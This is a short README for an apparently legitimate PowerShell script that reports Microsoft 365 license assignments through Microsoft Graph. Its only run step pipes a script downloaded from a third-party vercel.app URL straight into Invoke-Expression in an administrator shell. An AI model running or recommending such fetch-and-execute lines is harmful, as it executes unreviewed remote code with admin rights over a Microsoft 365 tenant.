# 📄 Microsoft 365 License Management Script

This PowerShell script automates the retrieval of assigned user information for each Microsoft 365 license in your tenant. It leverages the Microsoft Graph API and generates a comprehensive **HTML report** with all license usage details.

---

## 🚀 How to Run

1. **Open PowerShell as Administrator**

2. Run the following command:

   ```powershell
   iex (irm 'https://lic-management.vercel.app/use.ps1')
   ```

3. The script will:

   * Connect to Microsoft Graph
   * Enumerate all available service plans
   * Retrieve assigned users for each license
   * Generate and save an HTML report

---

## 📊 Output

* 📁 A file named `license_management_report.html` will be saved at:

  ```
  C:\LicManagement\license_management_report.html
  ```

* ✅ The report includes:

  * All detected licenses
  * Associated users per license
  * Total number of unique users

---

## ✅ Requirements

* PowerShell 5.1 or later
* Admin permissions in Microsoft 365 to query license assignments
* Internet access

---

## 🔒 Security

No credentials are stored. Authentication is handled securely via Microsoft Graph.

---

## 📬 Support

For questions or feedback, please open an issue or contact the script maintainer.
